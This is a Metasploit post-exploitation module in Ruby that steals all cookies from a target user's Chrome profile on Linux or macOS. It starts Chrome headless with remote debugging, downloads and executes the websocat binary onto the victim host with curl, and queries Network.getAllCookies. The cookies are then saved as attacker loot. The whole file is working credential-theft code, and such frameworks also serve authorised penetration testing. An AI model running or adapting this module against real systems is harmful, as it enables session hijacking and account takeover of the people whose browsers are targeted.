##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'net/http'
require 'json'

class MetasploitModule < Msf::Post
  include Msf::Post::File

  GET_ALL_COOKIES_REQUEST = '{"id": 1, "method": "Network.getAllCookies"}'.freeze
  WEBSOCAT_URL = 'https://github.com/vi/websocat/releases/download/v1.2.0/websocat_nossl_'.freeze

  def initialize(info = {})
    super(update_info(info,
                      'Name' => 'Chrome Gather Cookies',
                      'Description' => "
                      Read all cookies from the Default Chrome profile of the target user. Downloads and executes https://github.com/vi/websocat to communicate with the remote debugging interface Chrome exposes, and writes to disk.
                      ",
                      'License' => MSF_LICENSE,
                      'Author' => ['mangopdf <mangodotpdf[at]gmail.com>'],
                      'Platform' => %w[linux unix bsd osx],
                      'SessionTypes' => %w[meterpreter shell]))

    register_options(
      [
        OptString.new('CHROME_BINARY_PATH', [false, "The path to the user's Chrome binary (leave blank to use the default for the OS)", '']),
        OptString.new('HEADLESS_URL', [false, "The URL to load with the user's headless chrome", 'about://blank']),
        OptString.new('WEBSOCAT_STORAGE_PATH', [false, 'Where to write the websocat binary temporarily while it is used', '/tmp/websocat']),
        OptString.new('COOKIE_STORAGE_PATH', [false, 'Where to write the retrieved cookies temporarily', '/tmp/websocat.log']),
        OptInt.new('MAX_RETRIES', [false, 'Max retries for websocket request to Chrome remote debugging URL', 3]),
        OptInt.new('REMOTE_DEBUGGING_PORT', [false, 'Port on target machine to use for remote debugging protocol', 9222])
      ]
    )
  end


  def configure_for_platform
    vprint_status('Determining session platform')
    vprint_status("Platform: #{session.platform}")
    vprint_status("Type: #{session.type}")

    case session.platform
    when 'unix', 'linux', 'bsd', 'python'
      @platform = :unix
      @chrome = 'google-chrome'
      @user_data_dir = "/home/#{session.username}/.config/google-chrome/"
      @websocat_url_suffix = 'i386-linux'
    when 'osx'
      @platform = :osx
      @chrome = '/Applications/Google Chrome.app/Contents/MacOS/Google Chrome'
      @user_data_dir = expand_path "/Users/#{session.username}/Library/Application Support/Google/Chrome"
      @websocat_url_suffix = 'mac'
    when 'windows'
      print_error "Windows isn't supported by this module. See github.com/defaultnamehere/cookie_crimes for manual instructions."
      @platform = :windows
      return
    else
      print_error "Unsupported platform: #{session.platform}"
      return
    end

    unless datastore['CHROME_BINARY_PATH'].empty?
      @chrome = datastore['CHROME_BINARY_PATH']
    end

    @chrome_debugging_cmd = "#{@chrome} --headless --user-data-dir=\"#{@user_data_dir}\" --remote-debugging-port=#{datastore['REMOTE_DEBUGGING_PORT']} #{datastore['HEADLESS_URL']}"

    nil
  end

  def activate_remote_debugging
    @debugger_pid = cmd_exec_get_pid(@chrome_debugging_cmd)
    print_status("Activated Chrome's Remote Debugging via #{@chrome_debugging_cmd}")

    # Sleep so the Chrome process has time to start and open
    # the tab before we query the remote debugging port.
    # You may need a longer sleep time on a slower machine.
    sleep 2.seconds
  end

  def get_websocket_url
    response = cmd_exec("curl -s http://localhost:#{datastore['REMOTE_DEBUGGING_PORT']}/json")
    websocket_url = JSON.parse(response)[0]['webSocketDebuggerUrl']
    vprint_status("Found webSocketDebuggerUrl #{websocket_url}")
    websocket_url
  end

  def download_websocat
    if file_exist? @websocat_storage_path
      print_status "websocat binary already exists at #{@websocat_storage_path}, skipping download"
      return
    end

    url = WEBSOCAT_URL + @websocat_url_suffix
    print_warning "Writing websocat binary to #{@websocat_storage_path} temporarily"
    print_status "Downloading #{url} to #{@websocat_storage_path}"
    cmd_exec "curl -L #{url} > #{@websocat_storage_path}"
    chmod @websocat_storage_path
    vprint_status 'Download complete'

    # Sleep here because there's sometimes a race condition ("file busy") between the binary being downloaded and executed.
    sleep 5.seconds
  end

  def cleanup_websocat
    rm_f @websocat_storage_path
    print_status "Deleted #{@websocat_storage_path}"
    rm_f @cookie_storage_path
    print_status "Deleted #{@cookie_storage_path}"
  end

  def get_cookies(ws_url)

    download_websocat

    begin
      # Redirect to a file because websocat streams the data, and can't send cookies larger than 65535 bytes in one message.
      # This breaks cmd_exec, which cuts off the data partway. We're already writing to disk anyway, so I sure hope this is a good enough opsec tradeoff.
      print_warning "Writing cookies to #{@cookie_storage_path} temporarily"
      cmd = "echo '#{GET_ALL_COOKIES_REQUEST}' | #{@websocat_storage_path} -q #{ws_url} > #{@cookie_storage_path}"
      errors = cmd_exec cmd

      unless errors.empty?
        print_bad "Error running #{cmd}"
        print_error errors
      end

      cookies = read_file "#{@cookie_storage_path}"

      # The websocket debugger URL is sometimes flaky, for whatever reason, so
      # retry a few times.
      if cookies.empty?
        raise "No data read from websocket debugger url #{ws_url}"
      end

      # The cookies might be split into more than one message, delimited by '\n'. Remove them if so.
      cookies = cookies.delete "\n"

      result = JSON.parse cookies
      cookies = result['result']['cookies']
      print_good "Read #{cookies.length} cookies from #{ws_url}"
    rescue RuntimeError
      raise "Could not read any data from websocket debugger url #{ws_url}" if @retries.zero?

      print_bad "No data read from websocket debugger url #{ws_url}. Retrying... (Retries left: #{@retries -= 1})"
      sleep 5.seconds
      retry
    end

    cleanup_websocat

    cookies
  end

  def save(msg, data, ctype = 'text/json')
    ltype = 'chrome.gather.cookies'
    loot = store_loot ltype, ctype, session, data, nil, msg
    print_good "#{msg} stored in #{loot}"
  end

  def run
    fail_with Failure::BadConfig, 'No session found, giving up' if session.nil?

    @retries = datastore['MAX_RETRIES']
    @websocat_storage_path = datastore['WEBSOCAT_STORAGE_PATH']
    @cookie_storage_path = datastore['COOKIE_STORAGE_PATH']

    configure_for_platform
    activate_remote_debugging
    websocket_url = get_websocket_url
    cookies = get_cookies websocket_url
    save 'Chrome Cookies', cookies.to_json
  end
end
